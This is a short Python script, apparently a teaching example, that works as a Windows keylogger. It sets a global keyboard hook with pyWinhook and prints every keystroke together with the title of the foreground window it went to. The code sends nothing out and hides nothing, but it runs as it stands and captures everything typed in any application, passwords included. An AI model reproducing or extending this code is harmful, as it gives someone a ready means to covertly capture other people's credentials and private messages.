import win32gui
import pythoncom
import pyWinhook

# The "message pump" is a core part of any Windows program that is responsible for
# dispatching windowing messages to the various parts of the application. 

curWindow = None
def getCurProc():
	global curWindow
	try:
		hwnd = win32gui.GetForegroundWindow()
		winTitle = win32gui.GetWindowText(hwnd)
		if winTitle != curWindow:
			curWindow = winTitle
			print('[{}]'.format(winTitle))
	except:
		print('[Unknown Window]')


def OnKeyboardEvent(event):
	getCurProc()
	print('Key: {}    KeyID: {}'.format(event.Key, event.KeyID))
	return True

if __name__ == '__main__':
	hm = pyWinhook.HookManager()
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages()